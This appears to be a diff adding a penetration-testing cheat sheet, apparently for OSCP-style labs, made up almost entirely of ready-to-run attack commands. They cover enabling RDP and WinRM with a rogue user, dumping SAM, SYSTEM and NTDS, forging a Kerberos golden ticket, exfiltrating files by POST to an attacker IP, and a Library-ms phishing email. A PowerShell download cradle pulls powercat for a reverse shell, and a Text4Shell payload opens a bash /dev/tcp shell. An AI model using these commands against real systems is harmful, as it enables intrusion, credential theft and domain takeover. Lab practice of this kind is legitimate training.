@@ -1,0 +1,242 @@
+### NMAP
+```bash
+nmap -sCV -p U:53,161,T:- -oA scanme --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl -p- U:53,161 --reason --max-retries=1 --max-rtt-timeout=500ms --scan-delay 0 --min-rate 5500 -iL ./hosts -vvv
+
+nmap -sCV -p U:53,161,T:- -oA scanme --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl -p- --reason -iL ./hosts -vvv
+```
+### Sed
+```bash
+sed -i 's/<search regex>/<replacement>/g' <input file>
+```
+### Powershell:
+```powershell
+Enable RPD via powerhell:
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
+
+CMD:
+reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+Add user to group:
+.\SigmaPotato.exe 'net localgroup \"Remote Desktop Users\" hacker /add'
+```
+### WINRM:
+```powershell
+enable winrm via powershell:
+Enable-PSRemoting -Force
+
+Add user to WINRM:
+.\SigmaPotato.exe 'net localgroup \"Remote Management Users\" hacker /add'
+```
+
+Find programs installed:
+```powershell
+Get-ItemProperty "HKLM:\SOFTWARE\wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
+
+Find flags:
+```powershell
+Get-Childitem -Path C:\users -Include local.txt -Force -File -Recurse -ErrorAction SilentlyContinue | cat
+Get-Childitem -Path C:\users -Include proof.txt -Force -File -Recurse -ErrorAction SilentlyContinue | cat
+Get-Childitem -Path C:\users -Include *.txt -Force -File -Recurse -ErrorAction SilentlyContinue
+```
+
+Powershell history files:
+```powershell
+C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+Get-Childitem -Path C:\users -Include ConsoleHost_history.txt -Force -File -Recurse -ErrorAction SilentlyContinue | type
+
+FILES:
+dir -Force -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.Name -like '*.bat'-or $_.Name -like '*.cmd' -or $_.Name -like '*.kdb*'}
+
+STRINGS IN FILES:
+dir -Force -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.Name -like '*.txt' -or $_.Name -like '*.xml' -or $_.Name -like '*.bat' -or $_.Name -like '*.conf' -or $_.Name -like '*.cmd' -or $_.Name -like '*.cnf' -or $_.Name -like '*.kdb*'} | Select-String -pattern 'password', '@relia.com' -SimpleMatch | Select pattern, LineNumber, FileName, Path
+```
+
+Get SAM/SYSTEM dump:
+```powershell
+reg save hklm\system system
+reg save hklm\sam sam
+```
+
+Transfer files via powershell / nc:
+```powershell
+ATTACKER:
+nc -l -p 443 > file.b64
+
+VICTIM:
+$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FULL FILE PATH TO SEND>' -Encoding Byte)); Invoke-WebRequest -Uri http://<ATTACKER IP>:443 -Method POST -DisableKeepAlive -Timeout 15 -Body $b64;
+
+ATTACKER (AFTER RECEIVING):
+cat file.b64 | sed -n '8,$'p | base64 -d > <Original file>
+```
+
+copy NTDS with backup operator priv:
+```powershell
+mkdir C:\temp
+cd C:\temp
+echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
+echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
+echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
+echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
+
+diskshadow.exe /s c:\temp\diskshadow.txt
+cd z:\windows\ntds
+robocopy /b .\ C:\temp NTDS.dit
+
+https://juggernaut-sec.com/hackthebox-blackfield/
+```
+
+DCSYNC:
+```bash
+aesKey = user krbtgt
+domain-sid = current domain (whoami /user)
+domain = current domain
+extra-sid = target domain sid
+
+impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 \
+-domain-sid S-1-5-21-4168247447-1722543658-2110108262 \
+-domain sub.poseidon.yzx \
+-extra-sid S-1-5-21-1190331060-1711709193-932631991-519 \
+administrator -extra-pac
+
+export KRB5CCNAME=administrator.ccache
+
+impacket-psexec 'sub.poseidon.yzx/Administrator@dc01.poseidon.yzx' -k -no-pass
+
+(May have to add domain to /etc/hosts)
+```
+
+extract encrypted zip:
+```
+password="<password>"; 7z.exe x -p$password "archive.7z"
+```
+## Bloodhound
+```bash
+bloodhound-ce-python -u <USER> -p <PASS> --zip -c All -d <DOMAIN> -ns <DC IP>
+
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"
+```
+
+Win priv check:
+```
+https://github.com/pentestmonkey/windows-privesc-check
+```
+### Webdav:
+
+Make directory and start server:
+```bash
+mkdir /home/kali/webdav
+
+/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+```
+
+Make config.Library-ms NOTE IP!:
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.119.5</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+Make Powershell shortcut with nc shell:
+```powershell
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
+```
+
+Grab powercat.ps1:
+```
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+```
+
+Set nc listener:
+```bash
+nc -nvlp 4444
+```
+
+Move
+config.Library-ms  to webdav:
+```bash
+mv * /kali/webdav
+```
+
+Host the powershell shortcut with python:
+```bash
+python3 -m httpserver 8000 &
+```
+
+Send email with credentials to trigger user running the files:
+```bash
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server <TARGET> --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+```
+
+xfreerdp
+```bash
+xfreerdp3 /u:<USER> /p:<PASS> /v:{IP} +dynamic-resolution +clipboard /drive:/home/crazy/OSCP,OSCP
+
+TO USE HASHES USE /pth:<HASH> instead
+```
+
+## Git
+```
+git show
+git log
+git checkout <HASH / master>
+
+git-dumper:
+https://github.com/arthaud/git-dumper
+```
+
+## SMTP
+Try to obtain usernames / passwords:
+```bash
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./webdav
+```
+
+## keepass
+
+```powershell
+Get-ItemProperty "HKLM:\SOFTWARE\wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
+
+## doas
+See sudo like access
+```
+cat /usr/local/etc/doas.conf
+```
+
+Apache common text (Text4shell):
+```
+=${script:javascript:java.lang.Runtime.getRuntime().exec('/bin/bash -c bash$IFS$9-i>&/dev/tcp/192.168.45.241/443<&1')}
+```
+
+JDWP:
+```
+https://github.com/IOActive/jdwp-shellifier
+trigger by sending curl to port 5000:
+curl http://<TARGET>:5000
+```
+
+Standalone socat for linux port forwarding:
+```
+https://github.com/3ndG4me/socat/releases
+./socatx64.bin tcp-l:<EXTERNAL PORT>,fork tcp:127.0.0.1:<LOCAL PORT> &
+```
